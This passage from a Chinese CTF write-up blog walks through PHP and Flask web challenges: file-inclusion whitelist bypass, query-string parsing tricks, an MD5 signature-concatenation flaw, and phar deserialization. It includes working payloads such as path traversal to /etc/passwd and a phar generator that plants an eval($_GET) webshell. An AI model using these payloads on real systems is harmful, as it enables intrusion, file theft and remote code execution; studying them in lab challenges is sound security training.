<p> 源码中变量 $data 是由file_get_contents() 函数读取变量 $a 的值而得，所以 $a 的值必须为数据流.在服务器中自定义一个内容为 bugku is a nice plateform! 文件，再把此文件路径赋值给 $a，显然不太现实.因此这里用伪协议 php:// 来访问输入输出的数据流，其中php://input可以访问原始请求数据中的只读流.这里令 $a = “php://input”，并在请求主体中提交字符串 bugku is a nice plateform!.</p>
<p> ereg() 函数或 eregi() 函数存在空字符截断漏洞，即参数中的正则表达式或待匹配字符串遇到空字符则截断丢弃后面的数据。源码中待匹配字符串（第二个参数）已确定为 “1114”，正则表达式（第一个参数）由 “111” 连接 $b 的第一个字符组成，若令 substr($b,0,1) = “\x00”，即满足 “1114” 与 “111”匹配。因此，这里假设 $b = “\x0012345”.</p>
<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="HCTF-2018-Warmup"><a href="#HCTF-2018-Warmup" class="headerlink" title="HCTF 2018 Warmup"></a>HCTF 2018 Warmup</h2><ul>
<li><p>这个题目原型是phpmyadmin4.8.1的任意文件包含漏洞</p>
</li>
<li><p>点击hint进入，得到提示flag在ffffllllaaaagggg中，并发现URL格式为XXX/index.php?file=hint.php,顺势猜一下file=source.php有没有结果。得到如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&apos;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if (! empty($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&apos;file&apos;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>首先看这一段:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (! empty($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&apos;file&apos;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&apos;file&apos;])</span><br><span class="line">    )</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>也就是说checkfile的返回值要非空,就会将文件包含.</p>
<ul>
<li>接下来看这段:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>这段代码的意思是将post上的数据后面加?,然后提取出?之前的内容.</p>
<ul>
<li>这一段:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br><span class="line">$_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &apos;?&apos;, &apos;?&apos;)</span><br><span class="line">            );</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>首先对第一次提取出来的内容进行url编码,然后进行第二次提取.第二次提取出来的内容在白名单之内即返回true.</p>
<ul>
<li>最终payload：<code>file=source.php%253f/../../../../../ffffllllaaaagggg</code><br>第一次提取:<code>source.php%3f/../../../../../ffffllllaaaagggg</code><br>url编码后:<code>source.php?/../../../../../ffffllllaaaagggg</code><br>第二次提取:<code>source.php</code>,在白名单中则返回true.<br>但是在进行文件包含的时候依然会是原字符串,source.php%3f是个不存在的目录,依然不会影响.<h2 id="BUUCTF-easy-calc-国赛love-math"><a href="#BUUCTF-easy-calc-国赛love-math" class="headerlink" title="BUUCTF easy_calc(国赛love_math)"></a>BUUCTF easy_calc(国赛love_math)</h2></li>
<li>看一下页面源码，发现了提示：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">calc.php?num=encodeURIComponent($(&quot;#content&quot;).val())</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>$(“#content”).val() 是什么意思：</p>
<p>获取id为content的HTML标签元素的值,是JQuery,     $(“#content”)相当于document.getElementById(“content”);       $(“#content”).val()相当于 document.getElementById(“content”).value;</p>
<p>但是无论怎么注入都是400,403和500，这里用的是一个新的点：PHP的字符串解析特性:<br>我们知道PHP将查询字符串（在URL或正文中）转换为内部$ _GET或关联的关联$ _POST。例如<code>：/？foo = bar</code>变成<code>Array（[foo] =&gt;“ bar”）</code>。是，查询字符串在解析的过程中可以被某些字符删除或用下划线代替。例如，<code>/？％20news [id％00 = 42</code>会转换为<code>Array（[news_id] =&gt; 42）</code>。在解析查询字符串时，它会做两件事：1.删​​除空白符2.将某些字符转换为下划线（包括空格）.</p>
<ul>
<li><p>扫一下根目录，发现flagg文件：<code>?%20num=1;var_dump(scandir(chr(47)))</code></p>
</li>
<li><p>列出flagg:<code>?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>
<h2 id="De1CTF-ssrf-me"><a href="#De1CTF-ssrf-me" class="headerlink" title="De1CTF ssrf_me"></a>De1CTF ssrf_me</h2></li>
<li><p>直接查看页面源代码可以看到正确格式的代码:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! /usr/bin/env python</span><br><span class="line">#encoding=utf-8</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import request</span><br><span class="line">import socket</span><br><span class="line">import hashlib</span><br><span class="line">import urllib</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(&apos;latin1&apos;)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(16)</span><br><span class="line"></span><br><span class="line">class Task:</span><br><span class="line">    def __init__(self, action, param, sign, ip):</span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr</span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    def Exec(self):</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[&apos;code&apos;] = 500</span><br><span class="line">        if (self.checkSign()):</span><br><span class="line">            if &quot;scan&quot; in self.action:</span><br><span class="line">                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                if (resp == &quot;Connection Timeout&quot;):</span><br><span class="line">                    result[&apos;data&apos;] = resp</span><br><span class="line">                else:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">            if &quot;read&quot; in self.action:</span><br><span class="line">                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)</span><br><span class="line">                result[&apos;code&apos;] = 200</span><br><span class="line">                result[&apos;data&apos;] = f.read()</span><br><span class="line">            if result[&apos;code&apos;] == 500:</span><br><span class="line">                result[&apos;data&apos;] = &quot;Action Error&quot;</span><br><span class="line">        else:</span><br><span class="line">            result[&apos;code&apos;] = 500</span><br><span class="line">            result[&apos;msg&apos;] = &quot;Sign Error&quot;</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def checkSign(self):</span><br><span class="line">        if (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            return True</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line"></span><br><span class="line">#generate Sign For Action Scan.</span><br><span class="line">@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">def challenge():</span><br><span class="line">    action = urllib.unquote(request.cookies.get(&quot;action&quot;))</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    if(waf(param)):</span><br><span class="line">        return &quot;No Hacker!!!!&quot;</span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    return json.dumps(task.Exec())</span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    return open(&quot;code.txt&quot;,&quot;r&quot;).read()</span><br><span class="line"></span><br><span class="line">def scan(param):</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    try:</span><br><span class="line">        return urllib.urlopen(param).read()[:50]</span><br><span class="line">    except:</span><br><span class="line">        return &quot;Connection Timeout&quot;</span><br><span class="line"></span><br><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line">def md5(content):</span><br><span class="line">    return hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line">def waf(param):</span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.debug = False</span><br><span class="line">    app.run(host=&apos;0.0.0.0&apos;,port=80)</span><br></pre></td></tr></table></figure>
</li>
<li><p>提示给的是 flag 在 ./flag.txt 中，题目单词打错了.</p>
</li>
<li><p>python 的 flask 框架，三个路由，index 用于获取源码，geneSign 用于生成 md5，De1ta 就是挑战</p>
</li>
<li><p>大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，param=flag.txt，action 中要含有 read 和 scan，且 sign=md5(secert_key + param + action)</p>
</li>
<li><p>试着访问了一下 /geneSign?param=flag.txt ，给出了一个 md5 f36ac37ddfdcc567b5e4bfafd989672e ，但是只有 scan 的功能，想加入 read 功能就要另想办法了:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def geneSign():</span><br><span class="line">    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))</span><br><span class="line">    action = &quot;scan&quot;</span><br><span class="line">    return getSign(action, param)</span><br></pre></td></tr></table></figure>
</li>
<li><p>看了一下逻辑，在 getSign 处很有意思，这个字符串拼接的就很有意思了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def getSign(action, param):</span><br><span class="line">    return hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
</li>
<li><p>不妨假设 secert_key 是 xxx ，那么在开始访问 /geneSign?param=flag.txt 的时候，返回的 md5 就是 md5(‘xxx’ + ‘flag.txt’ + ‘scan’) ，在 python 里面上述表达式就相当于 md5(xxxflag.txtscan) ，这就很有意思了。</p>
</li>
<li><p>直接构造访问 /geneSign?param=flag.txtread ，拿到的 md5 就是 md5(‘xxx’ + ‘flag.txtread’ + ‘scan’) ，等价于 md5(‘xxxflag.txtreadscan’) ，这就达到了目标。</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>反序列化</title>
    <url>/2019/12/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h1 id="关于phar反序列化"><a href="#关于phar反序列化" class="headerlink" title="关于phar反序列化"></a>关于phar反序列化</h1><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><ul>
<li>简单的说，phar就是php的压缩文件，它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:// ，php://等类似，也是一种流包装器。<a id="more"></a>
phar结构由 4 部分组成:</li>
<li>stub:phar 文件标识，格式为 xxx<?php xxx; __HALT_COMPILER();?>；</li>
<li>manifest:压缩文件的属性等信息，以序列化存储；</li>
<li>contents:压缩文件的内容；</li>
<li>signature:签名，放在文件末尾；<br>这里有两个关键点：</li>
<li>一是文件标识，必须以__HALT_COMPILER();?&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；</li>
<li>二是反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多。<br>受影响的文件函数:fileatime,filectime,file_exists,file_get_contents,file_put_contents,file,filegroup,fopen,fileinode,filemtime,fileowner,fileperms,is_dir,is_executable,is_file,is_link,is_readable,is_writable,is_writeable,parse_ini_file,copy,unlink,stat,readfile.<br>如果有文件test.php:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Testobj</span><br><span class="line">&#123;</span><br><span class="line">	var $output=&quot;echo &apos;ok&apos;;&quot;;</span><br><span class="line">	function __destruct()</span><br><span class="line">	&#123;</span><br><span class="line">		eval($this-&gt;output);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;filename&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">	$filename=$_GET[&apos;filename&apos;];</span><br><span class="line">	var_dump(file_exists($filename));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>生成phar的文件phar.phar可以这样写：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Testobj</span><br><span class="line">&#123;</span><br><span class="line">  var $output=&apos;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&apos;test.phar&apos;);   //删除之前的test.par文件(如果有)</span><br><span class="line">$phar=new Phar(&apos;test.phar&apos;);  //创建一个phar对象，文件名必须以phar为后缀</span><br><span class="line">$phar-&gt;startBuffering();  //开始写文件</span><br><span class="line">$phar-&gt;setStub(&apos;&lt;?php __HALT_COMPILER(); ?&gt;&apos;);  //写入stub</span><br><span class="line">$o=new Testobj();  </span><br><span class="line">$o-&gt;output=&apos;eval($_GET[&quot;a&quot;]);&apos;;  </span><br><span class="line">$phar-&gt;setMetadata($o);//写入meta-data</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这样，当我们访问phar.phpr时，将会生成test.phar的phar文件。之后再将其作为参数传到test.php中，就可getshell.</p>
<p>利用条件:</p>
<ul>
<li>phar文件要能够上传到服务器端.</li>
<li>要有魔术方法作为跳板.</li>
<li>要有文件操作函数，如file_exists()，fopen()，file_get_contents()，file().</li>
<li>文件操作函数的参数可控，且:、/、phar等特<br>殊字符没有被过滤.<h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2></li>
<li>进入题目随便注册一个账号，可以上传文件filename=<code>.htaccess.jpg</code>。上传了之后可以删除和下载文件。在下载文件的包中发现是通过post参数filename来进行的，所以尝试能不能进行任意文件下载。<br>修改filename可进行任意文件的下载(下载不了flag)。<code>filename=../../../../../etc/passwd</code>.</li>
<li>于是下载网页源码，index.php，class.php，delete.php，ownload.php<br>注意到class.php中的Filelist类中的__destruct可以读取任意文件:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function __destruct() &#123;</span><br><span class="line">        $table = &apos;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&apos;;</span><br><span class="line">        $table .= &apos;&lt;thead&gt;&lt;tr&gt;&apos;;</span><br><span class="line">        foreach ($this-&gt;funcs as $func) &#123;</span><br><span class="line">            $table .= &apos;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&apos; . htmlentities($func) . &apos;&lt;/th&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= &apos;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&apos;;</span><br><span class="line">        $table .= &apos;&lt;/thead&gt;&lt;tbody&gt;&apos;;</span><br><span class="line">        foreach ($this-&gt;results as $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= &apos;&lt;tr&gt;&apos;;</span><br><span class="line">            foreach ($result as $func =&gt; $value) &#123;</span><br><span class="line">                $table .= &apos;&lt;td class=&quot;text-center&quot;&gt;&apos; . htmlentities($value) . &apos;&lt;/td&gt;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= &apos;&lt;td class=&quot;text-center&quot; filename=&quot;&apos; . htmlentities($filename) . &apos;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&apos;;</span><br><span class="line">            $table .= &apos;&lt;/tr&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo $table;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>class.php中的delete函数使用了unlink函数:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public function detele() &#123;</span><br><span class="line">       unlink($this-&gt;filename);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>而delete.php中又调用了delete函数:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[&apos;sandbox&apos;]);</span><br><span class="line">$file = new File();</span><br><span class="line">$filename = (string) $_POST[&apos;filename&apos;];</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(&quot;Content-type: application/json&quot;);</span><br><span class="line">    $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    Header(&quot;Content-type: application/json&quot;);</span><br><span class="line">    $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>生成phar文件的php代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class User &#123;</span><br><span class="line">        public $db;</span><br><span class="line">    &#125; </span><br><span class="line">    class File&#123;</span><br><span class="line">        public $filename;</span><br><span class="line">        public function __construct($name)&#123;</span><br><span class="line">            $this-&gt;filename=$name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class FileList &#123;</span><br><span class="line">        private $files;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;files=array(new File(&apos;/flag.txt&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    $o = new User();</span><br><span class="line">    $o-&gt;db =new FileList();</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">    $phar-&gt;setMetadata($o);</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); </span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>之后将生成的phar文件后缀改为jpg上传。<br>接下来再点击删除文件，将文件名改为phar://phar.jpg即可获得flag.</p>
<h1 id="0CTF-2016-piapiapia-php反序列化长度变化尾部字符串逃逸"><a href="#0CTF-2016-piapiapia-php反序列化长度变化尾部字符串逃逸" class="headerlink" title="0CTF-2016-piapiapia(php反序列化长度变化尾部字符串逃逸)"></a>0CTF-2016-piapiapia(php反序列化长度变化尾部字符串逃逸)</h1><ul>
<li>进行一下目录扫描，发现源码泄露<a href="http://www.zip，把源码给出：" target="_blank" rel="noopener">www.zip，把源码给出：</a><br>index.php:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&apos;class.php&apos;);</span><br><span class="line">	if($_SESSION[&apos;username&apos;]) &#123;</span><br><span class="line">		header(&apos;Location: profile.php&apos;);</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">	if($_POST[&apos;username&apos;] &amp;&amp; $_POST[&apos;password&apos;]) &#123;</span><br><span class="line">		$username = $_POST[&apos;username&apos;];</span><br><span class="line">		$password = $_POST[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">		if(strlen($username) &lt; 3 or strlen($username) &gt; 16) </span><br><span class="line">			die(&apos;Invalid user name&apos;);</span><br><span class="line"></span><br><span class="line">		if(strlen($password) &lt; 3 or strlen($password) &gt; 16) </span><br><span class="line">			die(&apos;Invalid password&apos;);</span><br><span class="line"></span><br><span class="line">		if($user-&gt;login($username, $password)) &#123;</span><br><span class="line">			$_SESSION[&apos;username&apos;] = $username;</span><br><span class="line">			header(&apos;Location: profile.php&apos;);</span><br><span class="line">			exit;	</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			die(&apos;Invalid user name or password&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;form action=&quot;index.php&quot; method=&quot;post&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">			&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">			&lt;h3&gt;Login&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Username:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Password:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line"></span><br><span class="line">			&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;LOGIN&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>在输入账号密码之后进入了profile.php，下面是profile.php的源码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&apos;class.php&apos;);</span><br><span class="line">	if($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class="line">		die(&apos;Login First&apos;);	</span><br><span class="line">	&#125;</span><br><span class="line">	$username = $_SESSION[&apos;username&apos;];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	if($profile  == null) &#123;</span><br><span class="line">		header(&apos;Location: update.php&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[&apos;phone&apos;];</span><br><span class="line">		$email = $profile[&apos;email&apos;];</span><br><span class="line">		$nickname = $profile[&apos;nickname&apos;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">		&lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt;</span><br><span class="line">		&lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt;</span><br><span class="line">		&lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>还有注册页面的源码(没有太大用)，register.php：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&apos;class.php&apos;);</span><br><span class="line">	if($_POST[&apos;username&apos;] &amp;&amp; $_POST[&apos;password&apos;]) &#123;</span><br><span class="line">		$username = $_POST[&apos;username&apos;];</span><br><span class="line">		$password = $_POST[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">		if(strlen($username) &lt; 3 or strlen($username) &gt; 16) </span><br><span class="line">			die(&apos;Invalid user name&apos;);</span><br><span class="line"></span><br><span class="line">		if(strlen($password) &lt; 3 or strlen($password) &gt; 16) </span><br><span class="line">			die(&apos;Invalid password&apos;);</span><br><span class="line">		if(!$user-&gt;is_exists($username)) &#123;</span><br><span class="line">			$user-&gt;register($username, $password);</span><br><span class="line">			echo &apos;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&apos;;		</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			die(&apos;User name Already Exists&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script 